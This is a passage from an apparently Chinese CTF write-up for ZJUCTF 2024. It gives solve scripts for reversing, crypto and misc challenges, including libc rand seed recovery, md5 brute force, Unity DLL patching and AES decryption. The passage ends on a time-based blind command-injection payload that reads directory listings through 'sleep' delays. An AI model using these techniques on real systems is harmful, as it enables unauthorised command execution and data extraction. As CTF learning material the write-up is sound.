class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63610</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>io.recvline()<br>rand1,rand2 = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[:-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;?&quot;</span>)]<br><span class="hljs-built_in">print</span>(rand1,rand2)<br>libc = ctypes.CDLL(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>temp = libc.time(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(temp)):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/24.png"></p></li><li><p>最后加上offset就能得到flag了： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">offset = <span class="hljs-number">1729249263</span>-<span class="hljs-number">1287399664</span><br>realtime = temp - offset<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(realtime-<span class="hljs-number">60</span>,realtime+<span class="hljs-number">60</span>):<br>    libc.srand(i)<br>    tmp1 = libc.rand()<br>    tmp2 = libc.rand()<br>    testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>    testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">if</span> testrand1==rand1 <span class="hljs-keyword">and</span> testrand2==rand2:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bomb! time is %d&quot;</span> % i)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>(<span class="hljs-params">time,<span class="hljs-built_in">len</span></span>):<br>    ans = <span class="hljs-string">&quot;&quot;</span><br>    libc.srand(time)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>):<br>        tmp1 = libc.rand()<br>        tmp2 = libc.rand()<br>        testrand1 = (tmp1 &lt;&lt; <span class="hljs-number">31</span>) | tmp2 ^ libc.rand()<br>        testrand2 = tmp2 | ((tmp1 ^ libc.rand()) &lt;&lt; <span class="hljs-number">31</span>)<br>        <span class="hljs-keyword">if</span> testrand1&gt;testrand2:<br>            ans+=<span class="hljs-string">&quot;&gt;&quot;</span><br>        <span class="hljs-keyword">elif</span> testrand1==testrand2:<br>            ans+=<span class="hljs-string">&quot;=&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            ans+=<span class="hljs-string">&quot;&lt;&quot;</span><br>    <span class="hljs-keyword">return</span> ans<br><br>io.recv()<br>ans = getans(i,<span class="hljs-number">0x1000</span>*<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    io.send(ans[i*<span class="hljs-number">0x1000</span>:i*<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x1000</span>])<br>    time.sleep(<span class="hljs-number">1</span>)<br>    io.recv()<br>io.send(<span class="hljs-string">b&quot;submit&quot;</span>)<br>io.interactive()<br><br><span class="hljs-comment"># ZJUCTF&#123;5aK1-CHan&#x27;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/25.png"></p></li></ul><div class="note note-info">            <p>但其实可以用C语言的LCG伪随机生成方式破解，我甚至忘了这回事😑</p>          </div><h2 id="rukma">rukma</h2><ul><li>稍微逆向了一下，发现是个游戏，flag是由x,m,o,-组合而成的，每遇到x,m,o就对8个比特的列表进行交换改变等操作，最终目标是得到5个3，还给了flag的md5值： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>flag = <span class="hljs-string">&quot;m-x-m-m-o-o-x-o-m-x-o-x&quot;</span><br><br><span class="hljs-comment"># - 有 11 个</span><br>b = [<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic</span>(<span class="hljs-params">tmp1,tmp2</span>):<br>    <span class="hljs-keyword">if</span> tmp1:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">1</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">1</span>]==<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> tmp2:<br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">6</span>]=<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">4</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">6</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">4</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">if</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span>:<br>            b[<span class="hljs-number">7</span>]=<span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">7</span>]==<span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> b[<span class="hljs-number">5</span>]==<span class="hljs-number">2</span> <span class="hljs-keyword">and</span> b[<span class="hljs-number">7</span>]==<span class="hljs-number">3</span>:<br>            b[<span class="hljs-number">5</span>]==<span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">3</span>:<br>            tmp+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> tmp==<span class="hljs-number">5</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">2</span>):<br>    i = flag[j]<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;x&quot;</span>:<br>        b[<span class="hljs-number">3</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">3</span>]<br>        magic(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;m&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>] = b[<span class="hljs-number">3</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">2</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;o&quot;</span>:<br>            b[<span class="hljs-number">0</span>],b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>] = b[<span class="hljs-number">5</span>],b[<span class="hljs-number">1</span>],b[<span class="hljs-number">4</span>],b[<span class="hljs-number">0</span>]<br>            magic(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            b = [<span class="hljs-number">0</span>]*<span class="hljs-number">8</span><br><br>md5_value = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span><br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></li><li>但是看了半天也没有理解x,m,o对应操作的意义是什么，然后发现可变的字符就3个，3**12种可能完全可以根据md5爆破（最后把flag代回去发现列表也没有5个3，肯定哪里逆向错了，懒得改了）： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>chars = [<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>]<br>combinations = itertools.product(chars, repeat=<span class="hljs-number">12</span>)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params">s</span>):<br>    flag = s[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        flag+=<span class="hljs-string">&quot;-&quot;</span>+s[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> flag<br>res = <span class="hljs-string">&quot;0A7E520E468C218583034BD49BE3B5DC&quot;</span>.lower()<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> combinations:<br>    test = getflag(<span class="hljs-string">&quot;&quot;</span>.join(combo))<br>    i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i%<span class="hljs-number">100</span>==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> / 531441&quot;</span>)<br>    <span class="hljs-keyword">if</span> md5(test.encode()).hexdigest()==res:<br>        <span class="hljs-built_in">print</span>(test)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># ZJUCTF&#123;m-x-m-m-o-o-x-o-m-x-o-x&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/26.png"></li></ul><h2 id="minecraft">minecraft</h2><ul><li>用dnSpy逆向data目录下的<code>Assembly-CSharp.dll</code>文件，得到整个游戏的逻辑，观察单人游戏的代码，将初始的获得方块数修改，就能得到第一部分flag( ZJUCTF{lt^5_ ): <img src="/img/zjuctf2024/34.png"> <img src="/img/zjuctf2024/35.png"></li><li>观察代码得到多人游戏的入口代码，应该是flag的第二段(sO_345y_M0dD): <img src="/img/zjuctf2024/36.png"></li><li>根据提示查看unity内部的资源，寻找相关flag的3d建模，果然发现了第三个flagpiece(1nG_uNi7y_k): <img src="/img/zjuctf2024/37.png"></li><li>根据提示去找没有应用的场景，发现有一个<code>ThroneRoomHandler</code>没有使用，那怎么让unity调用这个场景呢，我想了半天才想到，可以把多人游戏的代码改成<code>ThroneRoomHandler</code>的代码，并把unity需要加载该场景的<code>level4.resS</code>改成多人游戏所需要的场景，就看到了flag(VloCk1nG_rE}): <img src="/img/zjuctf2024/38.png"></li><li>连起来的flag:ZJUCTF{lt^5_sO_345y_M0dD1nG_uNi7y_kVloCK1nG_rE}，做出来这题是真有成就感，太难想了。</li></ul><h2 id="easyhap">easyhap</h2><ul><li>是一道鸿蒙的app逆向题，解包后将<code>.abc</code>文件放入分析软件，就可以得到源代码逻辑:</li><li>程序先规定了一堆窗口，这跟app外貌有关，然后读取你输入的flag，用CryptoUtil类下的encrypt方法加密flag与一串密文比对: <img src="/img/zjuctf2024/39.png"></li><li>encrypt方法进行了四次加密，先将flag拆成前后两部分，分别对其进行AES的ECB和CBC加密，再将后一段与前一段异或再与后一段拼起来，最后是一个base64的加密: <img src="/img/zjuctf2024/40.png"></li><li>写个脚本得到flag: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>res = <span class="hljs-string">&quot;Uzzj0V3pAh3AlPJ150WajAyXXST9UrJOdAo6iGDSj1c=&quot;</span><br>tmp = b64decode(res)<br>new = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    new += <span class="hljs-built_in">bytes</span>([tmp[i]^tmp[i+<span class="hljs-number">16</span>]])<br>new+=tmp[<span class="hljs-number">16</span>:]<br><span class="hljs-built_in">print</span>(new)<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_ECB)<br>new1 = cipher.decrypt(new[:<span class="hljs-number">16</span>])<br>cipher = AES.new(<span class="hljs-string">b&quot;ZJUCTF2024-OHAPP&quot;</span>, AES.MODE_CBC,new[:<span class="hljs-number">16</span>])<br>new2 = cipher.decrypt(new[<span class="hljs-number">16</span>:])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;ZJUCTF&#123;&quot;</span>+new1+new2+<span class="hljs-string">b&quot;&#125;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;_@_Ea5Y_ohaPp_@ND_a_5iMPl3_fl4g_&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="pwn"><strong>Pwn</strong></h1><div class="note note-danger">            <p>不会pwn...</p>          </div><h1 id="misc"><strong>Misc</strong></h1><p>这部分题目是最有意思的，需要的脑洞很大🫨</p><h2 id="小a口算">小A口算</h2><ul><li>与服务器交互，类似于小猿口算</li><li>用pwndbg交互即可: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">63142</span>)<br>io.recv()<br>io.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>io.recvline()<br>io.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getans</span>():<br>    tmp = io.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp.split(<span class="hljs-string">&quot;\n&quot;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;?&quot;</span> <span class="hljs-keyword">in</span> i:<br>            problem = i<br>            <span class="hljs-keyword">break</span><br>    num1,num2 = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,problem.split(<span class="hljs-string">&quot;?&quot;</span>))<br>    <span class="hljs-built_in">print</span>(num1,num2)<br>    <span class="hljs-keyword">if</span> num1==num2:<br>        io.sendline(<span class="hljs-string">b&quot;=&quot;</span>)<br>    <span class="hljs-keyword">elif</span> num1&gt;num2:<br>        io.sendline(<span class="hljs-string">b&quot;&gt;&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io.sendline(<span class="hljs-string">b&quot;&lt;&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    getans()<br>    <span class="hljs-keyword">if</span>  <span class="hljs-string">&quot;Correct!&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/1.png"></li></ul><h2 id="master-of-c">master of c++</h2><ul><li>用c++编写一个判断质数的函数，然后用main调用；</li><li>一开始还卡了半天，用递归写的，还以为是递归层数过高导致编译的问题，后来才发现是没有处理负数情况（恼）: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N,<span class="hljs-type">int</span> i&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=(N%i)&amp;&amp;(P&lt;N,i<span class="hljs-number">-2</span>&gt;::V);&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">P</span>&lt;N,<span class="hljs-number">1</span>&gt;&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=<span class="hljs-literal">true</span>;&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> N&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Q</span>&#123;<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">bool</span> V=N&lt;<span class="hljs-number">2</span>?<span class="hljs-number">1</span>:N==<span class="hljs-number">2</span>?<span class="hljs-number">0</span>:!(N%<span class="hljs-number">2</span>&amp;&amp;P&lt;N,N/<span class="hljs-number">2</span><span class="hljs-number">+1</span>-(N/<span class="hljs-number">2</span>)%<span class="hljs-number">2</span>&gt;::V);&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> Q&lt;ARG&gt;::V;&#125;<br></code></pre></td></tr></table></figure></li><li>flag是<code>ZJUCTF&#123;pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l&#125;</code></li></ul><h2 id="bytes">Bytes</h2><ul><li><p>拿到一堆数字，最大的是63即6位，猜测是转化成0/1并按照某种规则显示出flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;bytes.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>li = [<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readline().split(<span class="hljs-string">&quot;,&quot;</span>)]<br>text = <span class="hljs-string">&quot;&quot;</span>.join(li)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(text))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>,<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text)%i==<span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)//i):<br>            <span class="hljs-built_in">print</span>(text[j*i:(j+<span class="hljs-number">1</span>)*i])<br>        <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/4.png"></p></li><li><p>之前做校巴ZJUCTF2022那道 <code>wierd encoding</code> 就有这种思路了，只能说yelan的想法跟我不谋而合（）</p></li></ul><h2 id="chess-encoding">chess encoding</h2><ul><li><p>根据题目的提示，用棋盘编码，编写python脚本，最后得到一串数字，猜测是base8加密，得到flag： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chessdecode</span>(<span class="hljs-params">image_path</span>): <br>    image = Image.<span class="hljs-built_in">open</span>(image_path)<br>    img = image.convert(<span class="hljs-string">&#x27;RGB&#x27;</span>) <br><br>    width, height = img.size<br>    grid_size_x = width // <span class="hljs-number">8</span><br>    grid_size_y = height // <span class="hljs-number">8</span><br>    chess = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            center_x = i * grid_size_x + grid_size_x // <span class="hljs-number">2</span><br>            center_y = j * grid_size_y + grid_size_y // <span class="hljs-number">2</span><br>            r, g, b = img.getpixel((center_x, center_y))<br>            <span class="hljs-comment"># print(r,g,b)</span><br>            <span class="hljs-keyword">if</span> (r, g, b) != (<span class="hljs-number">239</span>,<span class="hljs-number">216</span>,<span class="hljs-number">180</span>) <span class="hljs-keyword">and</span> (r, g, b) != (<span class="hljs-number">180</span>,<span class="hljs-number">135</span>,<span class="hljs-number">98</span>):<br>                chess.append((i, j))<br>    text = <span class="hljs-string">&quot;01234567&quot;</span>[::-<span class="hljs-number">1</span>]<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chess:<br>        res = text[i[<span class="hljs-number">1</span>]]+res<br>    <span class="hljs-keyword">return</span> res<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    image_path = <span class="hljs-string">f&#x27;./chess-release/chess-release/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    res+=chessdecode(image_path)<br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">8</span>)))<br></code></pre></td></tr></table></figure></p><p><img src="/img/zjuctf2024/5.png"></p></li></ul><h2 id="silence">silence</h2><ul><li><p>用ida逆向一下，发现是个popen实现的shell，可以执行命令，但是回显被清除了，于是考虑时间盲注，首先发现<code>sleep 1</code>可执行，于是构造payload: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sleep $( [ &quot;$(ls /| tr &#x27;\n&#x27; &#x27; &#x27; | head -c i | tail -c 1)&quot; = letter ] &amp;&amp; echo 1)<br></code></pre></td></tr></table></figure></p></li><li><p>编写脚本得到ls的结果 (时间还是挺长的)，并且用<code>if ans_len!=2 and ans[-2:]==i*2:</code>强制中断<code>tail</code>导致的最后一个字符重复输出(后来想到可以先用wc爆破出长度，但是已经懒得改了): <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">55986</span>)<br><br>strings = <span class="hljs-string">&#x27; tabcdefghijklmnopqrsuvwxyz!#%&amp;()+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ*&#x27;</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;$ &quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcommand</span>(<span class="hljs-params">cmd</span>):<br>    t1 = time.time()<br>    